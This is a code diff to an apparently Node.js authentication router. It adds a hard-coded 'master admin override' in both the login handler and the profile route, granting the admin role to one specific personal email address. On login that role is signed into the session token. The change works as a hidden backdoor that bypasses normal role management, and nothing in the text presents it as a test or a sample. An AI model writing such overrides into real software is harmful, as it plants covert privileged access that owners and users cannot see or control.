@@ -292,6 +292,11 @@ router.post('/login', async (req, res) => {
 
 
 
+    // HARD-CODED MASTER ADMIN OVERRIDE
+    if (user.email === 'bharathguguloth735@gmail.com') {
+      user.role = 'admin';
+    }
+
     const token = jwt.sign({ id: user._id, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
 
     const session = await SessionLog.create({
@@ -415,6 +420,12 @@ router.get('/me', verifyToken, async (req, res) => {
   try {
     const user = await User.findById(req.user.id).select('-password');
     if (!user) return res.status(404).json({ message: 'User not found' });
+    
+    // HARD-CODED MASTER ADMIN OVERRIDE
+    if (user.email === 'bharathguguloth735@gmail.com') {
+      user.role = 'admin';
+    }
+    
     res.json(user);
   } catch (err) {
     res.status(500).json({ message: 'Error fetching profile', error: err.message });
